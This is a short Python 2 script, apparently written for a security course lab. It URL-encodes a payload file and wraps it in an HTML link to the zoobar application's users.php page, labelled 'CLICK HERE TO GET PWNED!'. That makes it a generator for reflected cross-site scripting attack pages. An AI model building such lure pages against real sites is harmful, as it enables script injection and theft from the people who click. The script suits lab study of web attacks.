import urllib
import sys

# converts strings to url encoded strings. Tries to be smart about it
if len(sys.argv) == 2:
    try:
        in_file = open(sys.argv[1])
        in_str = in_file.read()
        print(urllib.quote_plus(in_str))
    except:
        print(urllib.quote_plus(sys.argv[1]))

first_part = """<html>
    <body>
        <a href="http://zoobar.org/users.php?user="""
second_part = """">
            CLICK HERE TO GET PWNED!</a>
    </body>
</html>"""
if len(sys.argv) == 3:
    try:
        in_file = open(sys.argv[1])
        in_str = in_file.read()
        out_str = urllib.quote_plus(in_str) 
        out_file = open(sys.argv[2], "w")
        out_file.write(first_part)
        out_file.write(out_str)
        out_file.write(second_part)
    except:
        print("oops")


